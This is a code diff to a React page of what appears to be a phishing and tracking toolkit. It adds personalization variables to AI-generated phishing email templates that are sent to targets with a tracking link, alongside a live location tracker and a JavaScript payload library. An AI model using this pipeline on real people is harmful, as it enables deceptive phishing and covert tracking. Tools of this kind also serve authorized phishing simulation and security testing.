@@ -52,6 +52,15 @@ const aiTemplateSchema = z.object({
   scenario: z.string().min(10, 'Scenario description is required.'),
 });
 
+const getTemplateVariables = (template: Template | null): string[] => {
+    if (!template) return [];
+    const combinedText = `${template.subject || ''} ${template.body}`;
+    const matches = combinedText.match(/\{\{([a-zA-Z0-9_]+)\}\}/g) || [];
+    const uniqueMatches = [...new Set(matches)];
+    return uniqueMatches.map(v => v.replace(/[{}]/g, ''));
+};
+
+
 export default function LiveTrackerPage() {
   const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
   const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
@@ -72,6 +81,8 @@ export default function LiveTrackerPage() {
   const [isEmailModalOpen, setIsEmailModalOpen] = useState(false);
   const [emailTemplates, setEmailTemplates] = useState<Template[]>([]);
   const [selectedTemplate, setSelectedTemplate] = useState<Template | null>(null);
+  const [templateVariables, setTemplateVariables] = useState<string[]>([]);
+  const [variableValues, setVariableValues] = useState<Record<string, string>>({});
   const [generatedAiEmail, setGeneratedAiEmail] = useState<PhishingOutput | null>(null);
   const [isGeneratingAiEmail, setIsGeneratingAiEmail] = useState(false);
   const [isSendingEmail, setIsSendingEmail] = useState(false);
@@ -224,6 +235,8 @@ export default function LiveTrackerPage() {
     setSmtpConfig(storedSmtp);
     setSelectedTemplate(null);
     setGeneratedAiEmail(null);
+    setTemplateVariables([]);
+    setVariableValues({});
     newTemplateForm.reset();
     aiTemplateForm.reset();
     emailForm.reset();
@@ -250,7 +263,8 @@ export default function LiveTrackerPage() {
         scenario: values.scenario,
       });
       setGeneratedAiEmail(email);
-      setSelectedTemplate({ id: 'ai-generated', name: 'AI Generated Email', type: 'Email', ...email });
+      const aiTemplate = { id: 'ai-generated', name: 'AI Generated Email', type: 'Email', ...email };
+      setSelectedTemplate(aiTemplate);
     } catch (e) {
       toast({ variant: 'destructive', title: 'AI Generation Failed' });
     } finally {
@@ -270,13 +284,13 @@ export default function LiveTrackerPage() {
 
     setIsSendingEmail(true);
     try {
-      let body = selectedTemplate.body.replace(/\[Link\]/gi, `<a href="${hostedUrlForEmail}" target="_blank" rel="noopener noreferrer" style="color:hsl(var(--accent));font-weight:bold;text-decoration:underline;">Click Here</a>`);
-      body = body.replace(/\{\{\s*link\s*\}\}/gi, `<a href="${hostedUrlForEmail}" target="_blank" rel="noopener noreferrer" style="color:hsl(var(--accent));font-weight:bold;text-decoration:underline;">Click Here</a>`);
+      let body = renderPreview(selectedTemplate.body, true);
+      let subject = renderPreview(selectedTemplate.subject);
 
       await sendTestEmail({
         ...smtpConfig,
         recipientEmail: values.recipientEmail,
-        subject: selectedTemplate.subject || 'Important Notification',
+        subject: subject || 'Important Notification',
         html: body,
         text: body.replace(/<[^>]+>/g, ''),
       });
@@ -290,6 +304,37 @@ export default function LiveTrackerPage() {
     }
   };
 
+  useEffect(() => {
+    const variables = getTemplateVariables(selectedTemplate);
+    setTemplateVariables(variables);
+    // Reset values when template changes
+    setVariableValues({});
+  }, [selectedTemplate]);
+  
+  const handleVariableChange = (key: string, value: string) => {
+    setVariableValues(prev => ({ ...prev, [key]: value }));
+  };
+
+  const renderPreview = (text?: string, forSending: boolean = false): string => {
+      if (!text) return '';
+      let renderedText = text;
+      
+      const allValues = { ...variableValues, link: hostedUrlForEmail };
+
+      for (const key in allValues) {
+          const value = allValues[key] || (forSending ? '' : `{{${key}}}`);
+          renderedText = renderedText.replace(new RegExp(`\\{\\{${key}\\}\\}`, 'g'), value);
+      }
+      
+      // Special handling for the link for better previewing
+      if(!forSending) {
+           renderedText = renderedText.replace(/\[Link\]|\[(.*?)\]/gi, `<a href='#' class='text-accent font-bold underline'>[$1]</a>`);
+      } else {
+           renderedText = renderedText.replace(/\[Link\]|\[(.*?)\]/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));font-weight:bold;text-decoration:underline;'>$1</a>`);
+      }
+
+      return renderedText;
+  }
 
   const currentSessionEvents = selectedSessionId ? sessions[selectedSessionId] || [] : [];
   const location = currentSessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude)?.data;
@@ -341,7 +386,7 @@ export default function LiveTrackerPage() {
       <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 items-start">
         <div className="xl:col-span-2 flex flex-col gap-6">
           <LiveTracker sessions={sessionsMap} selectedSessionId={selectedSessionId} />
-          <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
+          <JavaScriptLibrary onSelectPayload={setSelectedPayload}/>
         </div>
         <div className="xl:col-span-1 flex flex-col gap-6">
           <SessionHistory sessions={sessionsMap} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
@@ -435,6 +480,17 @@ export default function LiveTrackerPage() {
                    </form></Form>
                 </TabsContent>
               </Tabs>
+              {templateVariables.length > 0 && (
+                <div className="space-y-2 border-t pt-4">
+                  <Label>Personalization</Label>
+                  {templateVariables.map(variable => (
+                    <div key={variable} className="grid grid-cols-3 items-center gap-4">
+                      <Label htmlFor={`var-${variable}`} className="text-right">{variable}</Label>
+                      <Input id={`var-${variable}`} value={variableValues[variable] || ''} onChange={(e) => handleVariableChange(variable, e.target.value)} className="col-span-2"/>
+                    </div>
+                  ))}
+                </div>
+              )}
               <Separator />
                <Form {...emailForm}><form onSubmit={emailForm.handleSubmit(onSendEmail)} className="space-y-4">
                 <FormField control={emailForm.control} name="recipientEmail" render={({field}) => (<FormItem><Label>Recipient Email</Label><Input type="email" placeholder="target@example.com" {...field}/><FormMessage/></FormItem>)}/>
@@ -446,12 +502,12 @@ export default function LiveTrackerPage() {
             </div>
             <div className="space-y-2">
               <Label>Live Preview</Label>
-              <Card className="h-96">
+              <Card className="h-[500px]">
                 <CardContent className="p-4 h-full overflow-y-auto">
                   {!selectedTemplate ? <p className="text-muted-foreground text-center pt-20">Select or generate a template.</p> : (
                     <div className="prose prose-sm dark:prose-invert">
-                      <h3>{selectedTemplate.subject}</h3>
-                      <div dangerouslySetInnerHTML={{ __html: selectedTemplate.body.replace(/\[.*?\]/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));font-weight:bold;text-decoration:underline;'>Click Here</a>`).replace(/\{\{\s*link\s*\}\}/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));font-weight:bold;text-decoration:underline;'>Click Here</a>`)}}/>
+                      <h3>{renderPreview(selectedTemplate.subject)}</h3>
+                      <div dangerouslySetInnerHTML={{ __html: renderPreview(selectedTemplate.body) }}/>
                     </div>
                   )}
                 </CardContent>
